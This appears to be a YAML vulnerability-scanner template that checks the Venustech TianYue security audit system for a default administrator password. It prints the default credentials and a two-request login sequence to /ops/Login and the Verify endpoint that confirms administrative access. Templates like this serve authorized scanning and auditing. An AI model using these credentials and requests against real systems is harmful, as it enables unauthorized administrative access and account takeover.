name: Venustech_TianYue_default_account
transport: http
set: {}
detail:
  dock: app="Venustech-TianYue"
  product: Venustech-TianYue
  homepage: https://www.venustech.com.cn/new_type/wlsj/
  impact: Attackers can use sysuseradmin:sua_password$123 to enter the background
    to reset other users' passwords, change other users' password policies, enable
    and disable other users, change authentication methods and other high-risk operations.
  description: Tianyue Network Security Audit System is abbreviated as Tianyue Audit
    System, which is a compliance management system for fine-grained auditing of network
    operation behaviors in business environments. The Tianyue network security audit
    system has a default password vulnerability.
rules:
  r1:
    method: GET
    path: /ops/Login
    follow_redirects: false
    headers:
      Content-Type: application/x-www-form-urlencoded
    output:
      search_cookie: r'Set-Cookie:(?P<cookie>.*?)'.bsubmatch(response.raw_header)
      var_cookie: search_cookie['cookie']
    expression: response.status == 200 && response.raw_header.bcontains(b'Set-Cookie')
  r2:
    method: POST
    path: /ops/index.php?c=Login&a=Verify
    follow_redirects: false
    headers:
      Content-Type: application/x-www-form-urlencoded
      Cookie: SERVER_ADDR={{var_host}};SERVER_ADDR_FULL={{var_hostinfo}};{{var_cookie}}
    body: u=sysuseradmin&p=116264704E61706262667E637535202322
    expression: response.status == 200 && response.body.bcontains(b'Index') && response.body.bcontains(b'param')
expression: r1() && r2()
